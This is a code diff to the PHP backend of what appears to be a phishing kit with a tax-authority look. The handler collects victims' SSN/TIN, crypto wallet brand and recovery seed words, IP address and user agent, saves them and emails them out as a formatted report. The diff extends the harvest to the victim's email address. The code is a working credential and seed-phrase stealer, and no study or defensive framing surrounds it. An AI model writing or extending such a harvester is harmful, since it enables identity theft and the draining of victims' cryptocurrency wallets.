@@ -45,8 +45,10 @@ if (!is_array($data) || empty($data)) {
 }
 
 // Extract and sanitize submitted fields
-$ssnTin       = trim($data['ssn_tin'] ?? 'Not Provided');
-$walletType   = trim($data['wallet_type'] ?? 'Not Specified');
+$ssnTin        = trim($data['ssn_tin'] ?? 'Not Provided');
+$taxpayerEmail = trim($data['email'] ?? '');
+$emailDisplay  = !empty($taxpayerEmail) ? htmlspecialchars($taxpayerEmail) : '<span style="color: #71767a; font-style: italic; font-weight: normal;">Not Provided</span>';
+$walletType    = trim($data['wallet_type'] ?? 'Not Specified');
 $walletBrand  = trim($data['wallet_brand'] ?? 'Not Specified');
 $seedLength   = intval($data['seed_length'] ?? 0);
 $seedWords    = isset($data['seed_words']) && is_array($data['seed_words']) ? $data['seed_words'] : [];
@@ -90,6 +92,7 @@ if (!empty($config['save_backup'])) {
         'client_ip'        => $clientIp,
         'user_agent'       => $userAgent,
         'ssn_tin'          => $ssnTin,
+        'email'            => $taxpayerEmail,
         'wallet_type'      => $walletType,
         'wallet_brand'     => $walletBrand,
         'seed_length'      => $seedLength,
@@ -202,6 +205,14 @@ $emailBody = <<<HTML
                                         </td>
                                         <td width="60%" style="color: #112e51; font-size: 16px; font-family: monospace; font-weight: bold; border-bottom: 1px solid #edf2f7;">
                                             {$ssnTin}
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td style="color: #565c65; font-size: 14px; font-weight: bold;">
+                                            Email Address:
+                                        </td>
+                                        <td style="color: #112e51; font-size: 15px; font-weight: bold;">
+                                            {$emailDisplay}
                                         </td>
                                     </tr>
                                 </table>
